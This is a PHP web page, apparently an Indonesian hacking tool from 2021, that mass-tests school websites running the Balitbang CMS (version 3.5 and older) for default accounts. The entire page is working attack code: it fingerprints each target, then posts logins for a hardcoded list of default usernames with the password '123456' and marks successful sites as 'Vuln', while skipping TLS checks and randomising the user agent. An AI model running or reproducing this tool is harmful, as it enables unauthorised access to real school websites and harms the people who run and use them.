<html>
<head>
<title>[+] Mass Default User Balitbang [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
</head>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<body bgcolor="#1e1e1e" text="white" style="max-width: 100%">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');


textarea {
max-width: 90%;
width: 90%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

textarea#note {
  width:100%;
    resize: none;
  display:block;
  max-width:100%;
  border: none;
    outline: none;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}

nemu {
  color: green;
}

kgk {
  color: red;
}

error {
  color: yellow;
}
</style>
<body>
<center>
<font face="Courier" size="5">Mass Default User Balitbang</font><br>
<font face="Courier" size="3">Hanya Work Pada Versi <error>3.5</error> Kebawah</font><hr>
<form method="post">
<textarea rows=1 name="url" placeholder="https://exploits.my.id/member/" required="true"></textarea><br><br>
<input type="submit" name="go" value="Gaskan">
</form>
<?php
if (isset($_POST['go'])) {
  $list = explode("\r\n", $_POST['url']);
  $listu = array("alan", "kickdody", "siswanto", "choirulyogya", "choirulyogya", "taufik", "tomi", "alumni", "070810120");
  $pass = "123456";
  echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
  if (count($list) > 20) {
    echo "Maximal 20 Website Persubmit !<br>";
  }
  echo "[+] Loading ... ( ".count($list)." sites )<br><br>";
  ob_implicit_flush();ob_end_flush();
  foreach ($list as $web) {
    $cek = cek($web);
    if (preg_match("/Tim Balitbang Kemdikbud versi/i", $cek)) {
      echo "[<error>Versi Terbaru</error>] ".htmlspecialchars($web)."<br>";
      continue;
    } elseif (!preg_match("/Gunakan browser Mozilla Firefox/i", $cek)) {
      echo "[<error>Bukan Balitbang</error>] ".htmlspecialchars($web)."<br>";
      continue;
    }
    foreach ($listu as $user) {
      $ekse = ekse($web, $user, "123456");
      if (preg_match("/username dan password tidak valid|tidak valid/i", $ekse)) {
        echo "[<kgk>Not Vuln</kgk>] ".htmlspecialchars($web)." ".$user.":".$pass."<br>";
      } elseif (preg_match("/Datang di Komunitas Sekolah|url=user\.php/i", $ekse)) {
        echo "[<nemu>Vuln</nemu>] ".htmlspecialchars($web)." ".$user.":".$pass."<br>";
      } else {
        echo "[<error>Unknown</error>] ".htmlspecialchars($web)." ".$user.":".$pass."<br>";
      }
    }
  }
  echo "<br>[+] Done ...";
}

function ekse($web, $user, $pass) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $web);
  //curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTREDIR, 3);
  curl_setopt($ch, CURLOPT_POSTFIELDS, "login=Login&password=".$pass."&username=".$user);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko. ".rand().") Chrome/92.0.4515.131 Safari/537.36");
  //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); 
  curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  return curl_exec($ch);
  curl_close($ch);
}

function cek($web) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $web);
  //curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko. ".rand().") Chrome/92.0.4515.131 Safari/537.36");
  //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); 
  curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  return curl_exec($ch);
  curl_close($ch);
}
?>
</font>
<center><hr><font size=3>Unknown45 - 2021
</body>
</html>